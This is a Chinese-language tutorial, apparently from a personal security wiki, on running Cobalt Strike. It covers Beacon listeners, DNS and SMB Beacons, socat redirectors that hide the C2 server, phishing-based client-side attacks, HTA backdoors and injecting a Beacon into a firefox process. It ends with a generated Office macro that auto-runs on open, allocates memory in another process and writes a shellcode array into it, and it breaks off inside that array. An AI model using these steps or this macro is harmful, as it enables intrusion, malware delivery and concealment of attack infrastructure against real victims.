监听器管理</h3><ul><li><p>什么是监听器</p><p>顾名思义，监听器就是等待被入侵系统连接自己的一个服务。</p></li><li><p>监听器的作用</p><p>主要是为了接受payload回传的各类数据，类似于MSF中handler的作用。</p><p>比如payload在目标机器执行以后，就会回连到监听器然后下载执行真正的shellcode代码。</p></li></ul><p>一旦监听器建立起来，团队成员只需要知道这个监听器的名称即可，不用关心监听器背后的基础环境，接下来将深入了解如何准确配置监听器。</p><p>一个监听器既是一个 payload 的配置信息，同时又是 Cobalt Strike 起一个服务器来接收来自这个payload 的连接的指示。一个监听器由用户定义的名称、payload 类型和几个特定于 payload 的选项组成。 </p><p>监听器的名字一般由以下结构组成：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">OperatingSystem/Payload/Stager</span><br></pre></td></tr></table></figure><p>例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">windows/beacon_http/reverse_http</span><br></pre></td></tr></table></figure><p><strong>什么是传输器</strong></p><p>payload staging（分阶段传送 payload）。在很多攻击框架的设计中，解耦了攻击和攻击执行的内容。payload 就是攻击执行的内容。payload 通常被分为两部分：payload stage 和 payload stager。</p><p>攻击载荷<code>payload</code>就是攻击执行的内容。攻击载荷通常被分为两部分：传输器<code>stager</code> 和传输体<code>stage</code>。</p><p>传输器<code>stager</code>是一个小程序，用于连接、下载传输体<code>stage</code>，并插入到内存中。</p><p>stager 是一个小程序，通常是手工优化的汇编指令，用于下载一个payload stage、把它注入内存，然后对其传达执行命令。这个过程被称为 staging（分阶段）。<br>staging（分阶段）过程在一些攻击行动中是必要的。很多攻击中对于能加载进内存并在成功漏洞利用后执行的数据大小存在严格限制。这会极大地限制你的后渗透选择，除非你分阶段传送你的后渗透payload。Cobalt Strike 在它的用户驱动攻击中使用 staging（分阶段）。大多数这类项目Attacks → Packages 和 Attacks → Web Drive-by 选项下。使用什么样的 stager 取决于与攻击配对的 payload。比如，HTTP Beacon 有一个 HTTP stager。DNS Beacon 有一个 DNS TXT 记录 stager。不是所有的 payload 都有 stager 选项。</p><p>没有 stager 的 Payload 不能使用这些攻击选项投递。如果你不需要 payload staging（分阶段），通过在你的 C2 拓展文件里把 host_stage 选项设为false，你可以关闭这个选项。这会阻止 Cobalt Strike 在其 web 和 DNS 服务器上托管 payloadstage。这种设置有助于提升行为安全（避免反溯源），因为如果开启了 staging（分阶段），任何人都能连到你的服务器上，请求一个 payload、并分析它的内容，从而可以从你的 payload 配置中获取信息。  </p><p><strong>创建监听器</strong></p><p>要管理 Cobalt Strike 的监听器，通过 Cobalt Strike → Listeners 。这会打开一个标签页，列举出所有你的配置的 payload 和监听器。  </p><p>在填写监听器的相关信息之前，需要先来了解监听器有哪些类型。</p><p>Cobalt Strike有两种类型的监听器：</p><ul><li>Beacon</li></ul><p>Beacon直译过来就是灯塔、信标、照亮指引的意思，Beacon是较为隐蔽的后渗透代理，个人理解Beacon类型的监听器应该是平时比较常用的。Beacon监听器的名称例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">windows/beacon_http/reverse_http</span><br></pre></td></tr></table></figure><ul><li>Foreign</li></ul><p>Foreign直译就是外部的，这里可以理解成对外监听器，这种类型的监听器主要作用是给其他的Payload提供别名，比如Metasploit 框架里的Payload，个人理解Foreign监听器在一定程度上提高了CS的兼容性。对外监听器的名称例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">windows/foreign/reverse_https</span><br></pre></td></tr></table></figure><h3 id="2-2-HTTP-Beacon和HTTPS-Beacon"><a href="#2-2-HTTP-Beacon和HTTPS-Beacon" class="headerlink" title="2.2 HTTP Beacon和HTTPS Beacon"></a>2.2 HTTP Beacon和HTTPS Beacon</h3><p><strong>Beacon是什么</strong></p><ul><li>Beacon是CS的Payload</li><li>Beacon有两种通信模式。一种是异步通信模式，这种模式通信效率缓慢，Beacon回连团队服务器、下载任务、然后休眠；另一种是交互式通信模式，这种模式的通信是实时发生的。</li><li>通过HTTP、HTTPS和DNS出口网络</li><li>使用SMB协议的时候是点对点通信</li><li>Beacon有很多的后渗透攻击模块和远程管理工具</li></ul><p><strong>Beacon的类型</strong></p><ul><li>HTTP 和 HTTPS Beacon</li></ul><p>HTTP和HTTPS Beacon也可以叫做Web Beacon。默认设置情况下，HTTP 和 HTTPS Beacon 通过 HTTP GET 请求来下载任务。这些 Beacon 通过 HTTP POST 请求传回数据。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">windows/beacon_http/reverse_http</span><br><span class="line">windows/beacon_https/reverse_https</span><br></pre></td></tr></table></figure><ul><li>DNS Beacon</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">windows/beacon_dns/reverse_dns_txt</span><br><span class="line">windows/beacon_dns/reverse_http</span><br></pre></td></tr></table></figure><ul><li>SMB Beacon</li></ul><p>SMB Beacon也可以叫做pipe beacon</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">windows/beacon_smb/bind_pipe</span><br></pre></td></tr></table></figure><p><strong>创建一个HTTP Beacon</strong></p><p>点击 Cobalt Strike –&gt; Listeners 打开监听器管理窗口，点击Add，输入监听器的名称、监听主机地址，因为这里是要创建一个HTTP Beacon，所以其他的默认就行，最后点击Save</p><p>此时可以测试一下刚才设置的监听器，点击Attack –&gt; Web Drive-by –&gt; Scripted Web Delivery(s) ，在弹出的窗口中选择刚才新添的Listener，因为我的靶机是64位的，所以我把Use x64 payload也给勾选上了，最后点击Launch。基础篇有详细步骤介绍。</p><p><strong>HTTPS Beacon</strong></p><p>HTTPS Beaocn和HTTP Beacon一样，使用了相同的Malleable C2配置文件，使用GET和POST的方式传输数据，不同点在于HTTPS使用了SSL，因此HTTPS Beacon就需要使用一个有效的SSL证书，具体如何配置可以参考：<a href="https://www.cobaltstrike.com/help-malleable-c2#validssl">https://www.cobaltstrike.com/help-malleable-c2#validssl</a></p><h3 id="2-3-DNS-Beacon"><a href="#2-3-DNS-Beacon" class="headerlink" title="2.3 DNS Beacon"></a>2.3 DNS Beacon</h3><p>DNS Beacon，顾名思义就是使用DNS请求将Beacon返回。这些 DNS 请求用于解析由你的 CS 团队服务器作为权威 DNS 服务器的域名。DNS 响应告诉 Beacon 休眠或是连接到团队服务器来下载任务。DNS 响应也告诉 Beacon 如何从你的团队服务器下载任务。</p><p>在CS 4.0及之后的版本中，DNS Beacon是一个仅DNS的Payload，在这个Payload中没有HTTP通信模式，这是与之前不同的地方。</p><p>DNS Beacon的工作流程具体如下：</p><p>首先，CS服务器向目标发起攻击，将DNS Beacon传输器stager嵌入到目标主机内存中，然后在目标主机上的DNS Beacon传输器stager回连下载CS服务器上的DNS Beacon传输体stage，当DNS Beacon在内存中启动后就开始回连CS服务器，然后执行来自CS服务器的各种任务请求。</p><p>原本DNS Beacon可以使用两种方式进行传输，一种是使用HTTP来下载Payload，一种是使用DNS TXT记录来下载Payload，不过现在4.0版本中，已经没有了HTTP方式，CS4.0以及未来版本都只有DNS TXT记录这一种选择了，所以接下来重点学习使用DNS TXT记录的方式。</p><p>根据作者的介绍，DNS Beacon拥有更高的隐蔽性，但是速度相对于HTTP Beacon会更慢。</p><p><strong>域名配置</strong></p><p>既然是配置域名，所以就需要先有个域名，这里就用一个博客域名作为示例：添加一条A记录指向CS服务器的公网IP，再添加几条ns记录指向A记录域名即可。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/6.png"></p><p>添加一个监听器，DNS Hosts填写NS记录和A记录对应的名称，DNS Host填写A记录对应的名称</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/7.png"></p><p>根据基础篇的方法创建一个攻击脚本，放到目标主机中运行后，在CS客户端可以看到一个小黑框</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/8.png"></p><p>然后经过一段时间的等待，就可以发现已经上线了</p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/9.png" style="zoom:50%;"><h3 id="2-4-SMB-Beacon"><a href="#2-4-SMB-Beacon" class="headerlink" title="2.4 SMB Beacon"></a>2.4 SMB Beacon</h3><p>SMB Beacon 使用命名管道通过一个父 Beacon 进行通信。这种对等通信对同一台主机上的 Beacon 和跨网络的 Beacon 都有效。Windows 将命名管道通信封装在 SMB 协议中。因此得名 SMB Beacon。</p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/10.png" style="zoom:67%;"><p>因为链接的Beacons使用Windows命名管道进行通信，此流量封装在SMB协议中，所以SMB Beacon相对隐蔽，绕防火墙时可能发挥奇效（系统防火墙默认是允许445的端口与外界通信的，其他端口可能会弹窗提醒，会导致远程命令行反弹shell失败）.</p><p>SMB Beacon监听器对“提升权限”和“横向渗透”中很有用。</p><p>SMB Beacon 配置</p><p>首先需要一个上线的主机，这里我使用的HTTP Beacon，主机上线后，新建一个SMB Beacon，输入监听器名称，选择Beacon SMB，管道名称可以直接默认，也可以自定义。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/11.png"></p><p>接下来在Beacon中直接输入spawn SMB，这里的SMB指代的是创建的SMB Beacon的监听器名称，也可以直接右击session，在Spawn选项中选择刚添加的SMB Beacon。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/12.png"></p><p>等待一会儿，就可以看到派生的SMB Beacon，在external中可以看到IP后有个∞∞字符。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/13.png"></p><p>接下来我这里将SMB Beacon插入到进程中，以firefox进程为例。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/14.png"></p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/15.png"></p><p>在firefox中插入SMB Beacon后，便能看到process为firefox的派生SMB Beacon。</p><p>在CS中，如果获取到目标的管理员权限，在用户名后会有*号标注。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/16.png"></p><p>当上线主机较多的时候，只靠列表的方式去展现，就显得不太直观了，通过CS客户端中的透视图便能很好的展现。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/17.png"></p><h3 id="2-5-重定向器"><a href="#2-5-重定向器" class="headerlink" title="2.5 重定向器"></a>2.5 重定向器</h3><p>重定向器Redirectors是一个位于CS团队服务器和目标网络之间的服务器，这个重定向器通俗的来说就是一个代理工具，或者说端口转发工具，担任CS服务器与目标服务器之间的跳板机角色，整体流量就像下面这样。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">目标靶机 &lt;--------&gt; 多个并列的重定向器 &lt;------&gt; CS服务器</span><br></pre></td></tr></table></figure><p>重定向器在平时的攻击或者防御的过程中起到很重要的作用，主要有以下两点：</p><ul><li>保护自己的CS服务器，避免目标发现自己的真实IP</li><li>提高整体可靠性，因为可以设置多个重定向器，因此如果有个别重定向器停止工作了，整体上系统依旧是可以正常工作的</li></ul><p>Cobalt Strike 的监听器管理功能支持使用重定向器。当你设置一个 HTTP 或 HTTPS Beacon 监听器的时候，简单的指定你的重定向器 IP （在 Host 字段填入）。</p><p>Cobalt Strike 不会验证这个信息。如果你提供的 host 不隶属于当前主机（不是团队服务器的 IP），那么 Cobalt Strike 就假设它是重定向器。一种把服务器转变为重定向器的简单方法是使用 socat。</p><p><strong>创建一个重定向器</strong></p><p>这里就使用自己的内网环境作为测试了，首先理清自己的IP</p><p>CS服务器IP：10.251.0.35</p><p>目标靶机IP：10.251.0.29</p><p>重定向器IP：10.251.0.33 10.251.0.36</p><p>首先，需要先配置重定向器的端口转发，比如这里使用HTTP Beacon，就需要将重定向器的80端口流量全部转发到CS服务器上，使用socat的命令如下：下面是一句 socat 语法，作用是：将80端口上的所有连接转发到位于192.168.12.100的团队服务器的80端口：  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat TCP4-LISTEN:80,fork TCP4:10.251.0.35:80</span><br></pre></td></tr></table></figure><p>如果提示没有socat命令，安装一下即可。重定向器设置好之后，就新建一个HTTP Beacon，并把重定向器添加到HTTP Hosts主机列表中</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/18.png"></p><h3 id="2-6-攻击载荷安全特性"><a href="#2-6-攻击载荷安全特性" class="headerlink" title="2.6 攻击载荷安全特性"></a>2.6 攻击载荷安全特性</h3><ul><li><p>在Beacon传输Payload到目标上执行任务时都会先验证团队服务器，以确保Beacon只接受并只运行来自其团队服务器的任务，并且结果也只能发送到其团队服务器。</p></li><li><p>在刚开始设置Beacon Payload时，CS会生成一个团队服务器专有的公私钥对，这个公钥嵌入在Beacon的Payload Stage中。Beacon使用团队服务器的公钥来加密传输的元数据，这个元数据中一般包含传输的进程ID、目标系统IP地址、目标主机名称等信息，这也意味着只有团队服务器才能解密这个元数据。</p></li><li><p>当Beacon从团队服务器下载任务或团队服务器接收Beacon输出时，团队服务器将会使用Beacon生成的会话秘钥来加密任务并解密输出。</p></li><li><p>值得注意的是，Payload Stagers 因为其体积很小，所以没有这些的安全特性。</p></li></ul><h2 id="3-目标攻击"><a href="#3-目标攻击" class="headerlink" title="3.目标攻击"></a>3.目标攻击</h2><h3 id="3-1-客户端攻击"><a href="#3-1-客户端攻击" class="headerlink" title="3.1 客户端攻击"></a>3.1 客户端攻击</h3><p><strong>什么是客户端攻击</strong></p><p>客户端攻击根据教程直译过来就是一种依靠应用程序使用控制端来进行的可视化攻击。</p><p>原文：A client-side attack is an attack against an application used to view attacker controlled content.</p><p><strong>为什么要进行客户端攻击</strong></p><p>随着时代发展到了今天，在有各种WAF、防火墙的情况下，各种漏洞已经很难像过去那么好被利用了，攻击者想绕过防火墙发动攻击也不是那么容易的了。</p><p>而当我们发送一个钓鱼文件到客户端上，再由客户端打开这个文件，最后客户端穿过防火墙回连到我们，此时在客户端上我们就获得了一个立足点foothold。这样的一个过程是相对而言是较为容易的，这也是为什么要进行客户端攻击。</p><p><strong>如何获得客户端上的立足点</strong></p><p>1、尽可能多的了解目标环境，即做好信息收集工作</p><p>2、创建一个虚拟机，使它与目标环境尽可能的一致，比如操作系统、使用的浏览器版本等等都需要保证严格一致</p><p>3、攻击刚刚创建的虚拟机，这会是最好的攻击目标</p><p>4、精心策划攻击方法，达到使目标认为这些攻击行为都是正常行为的效果</p><p>5、将精心制作的钓鱼文件发送给目标，比如钓鱼邮件</p><p>如果这五步都非常细致精心的去准备，那么攻击成功的概率会大幅提升。</p><h3 id="3-2-系统侦察-System-Profiler"><a href="#3-2-系统侦察-System-Profiler" class="headerlink" title="3.2 系统侦察 System Profiler"></a>3.2 系统侦察 System Profiler</h3><p>系统侦察System Profiler是一个方便客户端攻击的侦察工具，这个工具将会在CS服务端上启动一个Web服务，这样当目标访问这个Web服务的时候，我们就能够看到目标使用的浏览器、操作系统等等指纹信息。</p><p>设置系统侦察需要首先在自己的VPS服务器上运行CS服务端，之后本地客户端进行连接，选择System Profiler功能模块，配置待跳转的URL等信息即可。</p><p>如果勾选了Use Java Applet to get information则可以发现目标的Java版本及内网IP地址，但是这样做被发现的风险就会提高，同时现在浏览器已经默认关闭了java执行权限，因此这个选项的作用也变得不大了。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/19.png"></p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/20.png"></p><p>配置完后，当用户打开配置后的链接，我们可以在三个地方进行观察</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1、View --&gt; Applications</span><br><span class="line">2、View --&gt; Web Log</span><br><span class="line">3、Cobalt Strike --&gt; Visualization --&gt; Target Table</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/21.png"></p><p>目标用户打开链接时，我们在CS上就能够看到目标使用的浏览器版本、系统版本等信息了，知道了版本信息，就能够进一步知道目标上可能存在什么漏洞。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/22.png"></p><p>注意的一点是如果 Cobalt Strike 的 web 服务器收到了lynx、wget 或 curl 的请求，CS会自动返回一个 404 页面，这样做是为了防御蓝队的窥探。</p><h3 id="3-3-用户驱动攻击"><a href="#3-3-用户驱动攻击" class="headerlink" title="3.3 用户驱动攻击"></a>3.3 用户驱动攻击</h3><p>用户驱动攻击User-Driven Attacks需要欺骗用户产生交互才行，但也有许多的优点。</p><p>首先用户驱动攻击不包含恶意攻击代码，所以用户系统上的安全补丁是没用的；其次无论目标使用什么版本的程序，我们都可以创建相应的功能来执行；最后因为用户驱动攻击十分可靠，也使得它很完美。</p><p>当我们采取行动来追踪并需要攻击时，它就像用户本地执行程序一样，CS为我们提供了几个用户驱动攻击的选项，分别如下：</p><p><strong>用户驱动攻击包</strong></p><p>用户驱动攻击包User-Driven Attacks Packages功能打开位置：Attacks –&gt; Packages</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/24.png"></p><p>1、HTML应用</p><p>HTML应用HTML Application生成(executable/VBA/powershell)这3种原理不同的VBScript实现的evil.hta文件。</p><p>2、Microsoft Office 宏文件</p><p>Microsoft Office 宏文件Microsoft Office Document Macros可以生成恶意宏放入office文件，非常经典的攻击手法。</p><p>3、Payload 生成器</p><p>Payload生成器Payload Generator可以生成各种语言版本的Payload，便于进行免杀。</p><p>4、Windows 可执行文件</p><p>Windows 可执行文件Windows Executable 会生成一个Windows可执行文件或DLL文件。默认x86，勾选x64表示包含x64 payload stage生成了artifactX64.exe(17kb) artifactX64.dll(17kb)</p><p>5、Windows 可执行文件（Stageless）</p><p>Windows 可执行文件（Stageless）Windows Executable (Stageless)会生成一个无进程的Windows可执行文件或DLL文件。其中的 Stageless 表示把包含payload在内的”全功能”被控端都放入生成的可执行文件beconX64.exe(313kb) beconX64.dll(313kb) becon.ps1(351kb)</p><h4 id="3-3-1-hta后门"><a href="#3-3-1-hta后门" class="headerlink" title="3.3.1 hta后门"></a>3.3.1 hta后门</h4><p>首先来到Attacks –&gt; Packages –&gt; HTML Application创建一个HTML应用，如果没有创建监听的话，还需要创建一个监听。选择监听器，通过Generate生成。注意：这里需要使用powershell的方式生成hat文件，否则会报错。选择保存的路径即可。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/26.png"></p><p>HTML应用文件生成好后，来到Attacks –&gt; Web Drive-by –&gt; Host File，选择刚才生成的文件。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/27.png"></p><p>最后点击Launch，复制CS创建的链接，在目标主机上打开此链接。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/28.png"></p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/29.png"></p><p>当该文件在目标上运行后，CS客户端上就可以看到回连的会话了。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/30.png"></p><h4 id="3-3-2-宏病毒"><a href="#3-3-2-宏病毒" class="headerlink" title="3.3.2 宏病毒"></a>3.3.2 宏病毒</h4><p>点击Attacks–&gt;Packages–&gt;MS Office Macro。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/31.png"></p><p>然后选择一个监听器，点击Generate，然后点击Copy Macro。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/32.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">Private Type PROCESS_INFORMATION</span><br><span class="line">    hProcess As Long</span><br><span class="line">    hThread As Long</span><br><span class="line">    dwProcessId As Long</span><br><span class="line">    dwThreadId As Long</span><br><span class="line">End Type</span><br><span class="line"></span><br><span class="line">Private Type STARTUPINFO</span><br><span class="line">    cb As Long</span><br><span class="line">    lpReserved As String</span><br><span class="line">    lpDesktop As String</span><br><span class="line">    lpTitle As String</span><br><span class="line">    dwX As Long</span><br><span class="line">    dwY As Long</span><br><span class="line">    dwXSize As Long</span><br><span class="line">    dwYSize As Long</span><br><span class="line">    dwXCountChars As Long</span><br><span class="line">    dwYCountChars As Long</span><br><span class="line">    dwFillAttribute As Long</span><br><span class="line">    dwFlags As Long</span><br><span class="line">    wShowWindow As Integer</span><br><span class="line">    cbReserved2 As Integer</span><br><span class="line">    lpReserved2 As Long</span><br><span class="line">    hStdInput As Long</span><br><span class="line">    hStdOutput As Long</span><br><span class="line">    hStdError As Long</span><br><span class="line">End Type</span><br><span class="line"></span><br><span class="line">#If VBA7 Then</span><br><span class="line">    Private Declare PtrSafe Function CreateStuff Lib &quot;kernel32&quot; Alias &quot;CreateRemoteThread&quot; (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As LongPtr</span><br><span class="line">    Private Declare PtrSafe Function AllocStuff Lib &quot;kernel32&quot; Alias &quot;VirtualAllocEx&quot; (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr</span><br><span class="line">    Private Declare PtrSafe Function WriteStuff Lib &quot;kernel32&quot; Alias &quot;WriteProcessMemory&quot; (ByVal hProcess As Long, ByVal lDest As LongPtr, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As LongPtr) As LongPtr</span><br><span class="line">    Private Declare PtrSafe Function RunStuff Lib &quot;kernel32&quot; Alias &quot;CreateProcessA&quot; (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long</span><br><span class="line">#Else</span><br><span class="line">    Private Declare Function CreateStuff Lib &quot;kernel32&quot; Alias &quot;CreateRemoteThread&quot; (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As Long, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As Long</span><br><span class="line">    Private Declare Function AllocStuff Lib &quot;kernel32&quot; Alias &quot;VirtualAllocEx&quot; (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long</span><br><span class="line">    Private Declare Function WriteStuff Lib &quot;kernel32&quot; Alias &quot;WriteProcessMemory&quot; (ByVal hProcess As Long, ByVal lDest As Long, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As Long) As Long</span><br><span class="line">    Private Declare Function RunStuff Lib &quot;kernel32&quot; Alias &quot;CreateProcessA&quot; (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDriectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long</span><br><span class="line">#End If</span><br><span class="line"></span><br><span class="line">Sub Auto_Open()</span><br><span class="line">    Dim myByte As Long, myArray As Variant, offset As Long</span><br><span class="line">    Dim pInfo As PROCESS_INFORMATION</span><br><span class="line">    Dim sInfo As STARTUPINFO</span><br><span class="line">    Dim sNull As String</span><br><span class="line">    Dim sProc As String</span><br><span class="line"></span><br><span class="line">#If VBA7 Then</span><br><span class="line">    Dim rwxpage As LongPtr, res As LongPtr</span><br><span class="line">#Else</span><br><span class="line">    Dim rwxpage As Long, res As Long</span><br><span class="line">#End If</span><br><span class="line">    myArray = Array(-4,-24,-119,0,0,0,96,-119,-27,49,-46,100,-117,82,48,-117,82,12,-117,82,20,-117,114,40,15,-73,74,38,49,-1,49,-64,-84,60,97,124,2,44,32,-63,-49, _</span><br><span 